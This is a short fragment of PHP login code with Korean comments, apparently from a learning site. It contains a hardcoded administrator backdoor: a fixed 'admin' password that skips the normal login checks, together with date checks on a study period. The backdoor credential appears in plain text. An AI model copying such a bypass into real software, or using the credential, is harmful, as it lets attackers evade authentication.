...
if ($mb_id == 'admin' && $mb_password == 'tkaruqtkf') {
// 관리자 백도어 비번인 경우 체크 통과
}
else {
...
// 학습기간 체크
if (($mb['mb_8'] > date("Ymd", G5_SERVER_TIME) || $mb['mb_9'] < date("Ymd", G5_SERVER_TIME)) && $mb['mb_level'] < 6) {
...
//NS 중간 포인트 누적 변경때문에. 포인트가 꼬여서 주석처리해놓음. 20.07.01
/*
